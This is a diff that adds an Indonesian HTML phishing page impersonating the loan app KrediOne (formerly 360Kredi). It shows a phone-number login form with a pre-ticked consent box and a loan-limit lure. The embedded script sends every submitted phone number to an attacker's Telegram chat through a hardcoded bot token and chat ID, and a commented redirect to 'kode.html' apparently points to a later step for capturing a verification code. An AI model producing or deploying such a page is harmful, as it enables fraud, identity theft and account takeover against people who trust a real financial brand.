@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>KrediOne - Nomor Ponsel</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #fff;
+    margin: 16px 20px 30px;
+    color: #222;
+    font-size: 14px;
+    line-height: 1.4;
+  }
+  .back-arrow {
+    width: 24px;
+    height: 24px;
+    cursor: pointer;
+    margin-bottom: 20px;
+    fill: #222;
+    display: inline-block;
+  }
+  .greeting {
+    display: inline-block;
+    color: #00b14f;
+    font-weight: 600;
+    border: 1.5px solid #00b14f;
+    border-radius: 5px;
+    padding: 2px 8px;
+    margin-bottom: 4px;
+    font-size: 16px;
+    font-family: 'Segoe UI Semibold', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  }
+  .sub-greeting {
+    color: #00b14f;
+    font-weight: 500;
+    font-size: 13px;
+    margin: 0 0 24px 0;
+  }
+  h1 {
+    font-size: 22px;
+    font-weight: 700;
+    color: #111;
+    margin-bottom: 16px;
+  }
+  .phone-input-container {
+    position: relative;
+    max-width: 360px;
+    margin-bottom: 10px;
+  }
+  .phone-input {
+    width: 100%;
+    padding: 14px 40px 14px 48px;
+    border-radius: 24px;
+    border: 1px solid #ddd;
+    font-size: 14px;
+    color: #555;
+    box-sizing: border-box;
+    outline: none;
+  }
+  .phone-input::placeholder {
+    color: #999;
+  }
+  .flag-icon {
+    position: absolute;
+    top: 50%;
+    left: 12px;
+    transform: translateY(-50%);
+    width: 28px;
+    height: 20px;
+  }
+  .limit-tag {
+    position: absolute;
+    top: -22px;
+    right: 0;
+    background: #ffefcf;
+    color: #d87f1e;
+    font-weight: 600;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-size: 12px;
+    white-space: nowrap;
+    box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+  }
+  .btn-continue {
+    margin-top: 20px;
+    max-width: 360px;
+    width: 100%;
+    border: none;
+    border-radius: 24px;
+    padding: 14px 0;
+    background: linear-gradient(to right,#27c62b, #00b14f);
+    font-size: 16px;
+    font-weight: 600;
+    color: #fff;
+    cursor: pointer;
+    box-shadow: 0 3px 6px rgb(18 215 55 / 0.4);
+    transition: background 0.3s ease;
+  }
+  .btn-continue:disabled {
+    background: #a0d6a8;
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+  .agreement {
+    max-width: 360px;
+    margin-top: 18px;
+    font-size: 12.5px;
+    color: #777;
+    line-height: 1.3;
+  }
+  .agreement a {
+    color: #00b14f;
+    font-weight: 600;
+    text-decoration: none;
+  }
+  .agreement-checkbox {
+    vertical-align: middle;
+    margin-right: 6px;
+    accent-color: #00b14f;
+    width: 16px;
+    height: 16px;
+    margin-top: -2px;
+  }
+  .banner {
+    max-width: 360px;
+    margin-top: 32px;
+    border-radius: 8px;
+    overflow: hidden;
+  }
+  .banner img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+  @media (max-width: 200px) {
+    body {
+      margin: 8px 12px 20px;
+    }
+    .phone-input-container,
+    .btn-continue,
+    .agreement,
+    .banner {
+      max-width: 100%;
+    }
+  }
+</style>
+</head>
+<body>
+
+  <!-- Back arrow SVG -->
+  <svg class="back-arrow" onclick="history.back()" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Back">
+    <path d="M15.41 16.58L10.83 12l4.58-4.59L14 6l-6 6 6 6z"/>
+    <path d="M0 0h24v24H0z" fill="none"/>
+  </svg>
+
+  <div class="greeting">Halo!</div>
+  <div class="sub-greeting">Selamat Datang di KrediOne</div>
+
+  <h1>Nomor Ponsel</h1>
+
+  <div class="phone-input-container">
+    <!-- SVG Bendera Indonesia -->
+    <svg class="flag-icon" viewBox="0 0 32 24" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Bendera Indonesia" >
+      <rect width="32" height="12" fill="#e70013"/>
+      <rect y="12" width="32" height="12" fill="#fff"/>
+    </svg>
+
+    <input id="phoneNumber" type="text" class="phone-input" placeholder="Masukkan no HP(cth:08xxxxxxxxxx)" maxlength="13" inputmode="numeric" pattern="[0-9]*" autocomplete="tel" />
+    <div class="limit-tag">Limit tertinggi hingga 80 juta</div>
+  </div>
+
+  <button id="btnContinue" class="btn-continue">Lanjutkan</button>
+
+  <p class="agreement">
+    <input type="checkbox" id="agree" class="agreement-checkbox" checked />
+    Saya telah membaca dan menyetujui 
+    <a href="#" target="_blank" rel="noopener">Kebijakan Privasi</a>, 
+    <a href="#" target="_blank" rel="noopener">Syarat dan Ketentuan</a> serta 
+    <a href="#" target="_blank" rel="noopener">Surat Persetujuan</a> dari KrediOne (Sebelumnya 360Kredi)
+  </p>
+
+  <div class="banner">
+    <img src="https://cdn.phototourl.com/free/2026-04-02-997de918-66d9-4ed9-8ceb-a76ebe8bbcdf.png" alt="360Kredi Bertransformasi Menjadi KrediOne" />
+  </div>
+
+<script>
+  // Ganti sesuai data Bot Telegram Anda:
+  const BOT_TOKEN = '8773945014:AAHq97DnPNdeSQbtxqrP1mjg8ypmGpFG2MI';
+  const CHAT_ID = '6351598509';
+
+  const phoneInput = document.getElementById('phoneNumber');
+  const btnContinue = document.getElementById('btnContinue');
+  const agreeCheckbox = document.getElementById('agree');
+
+  // Fungsikan tombol lanjutkan
+  btnContinue.addEventListener('click', () => {
+    const phone = phoneInput.value.trim();
+    const agreed = agreeCheckbox.checked;
+
+    if(!phone){
+      alert('Harap masukkan nomor telepon Anda.');
+      phoneInput.focus();
+      return;
+    }
+    const phonePattern = /^08\d{6,11}$/; // contoh validasi: mulai 08, total minimal 8 sampai maksimal 13 digit
+    if(!phonePattern.test(phone)){
+      alert('Nomor telepon tidak valid. Gunakan format 08xxxxxxxxxx.');
+      phoneInput.focus();
+      return;
+    }
+    if(!agreed){
+      alert('Anda harus menyetujui Kebijakan Privasi dan Syarat Ketentuan.');
+      return;
+    }
+
+    // Simpan data ke localStorage
+    localStorage.setItem('kredione_phone', phone);
+
+    // Kirim ke Telegram
+    const message = `📱 Nomor Telepon Baru dari Website:\n${phone}`;
+    
+    btnContinue.disabled = true;
+    btnContinue.textContent = 'Mengirim...';
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message
+      })
+    })
+    .then(res => res.json())
+    .then(data => {
+      btnContinue.disabled = false;
+      btnContinue.textContent = 'Lanjutkan';
+      if(data.ok){
+        // Bisa dialihkan ke halaman lain jika perlu
+        // window.location.href = 'kode.html';
+      } else {
+        alert('Gagal mengirim ke Telegram: ' + data.description);
+      }
+    })
+    .catch(err => {
+      btnContinue.disabled = false;
+      btnContinue.textContent = 'Lanjutkan';
+      alert('Error saat mengirim ke Telegram: ' + err.message);
+    });
+  });
+
+  // Isi input nomor jika data tersimpan
+  window.addEventListener('DOMContentLoaded', () => {
+    const savedPhone = localStorage.getItem('kredione_phone');
+    if(savedPhone){
+      phoneInput.value = savedPhone;
+    }
+  });
+</script>
+</body>
+    </html>
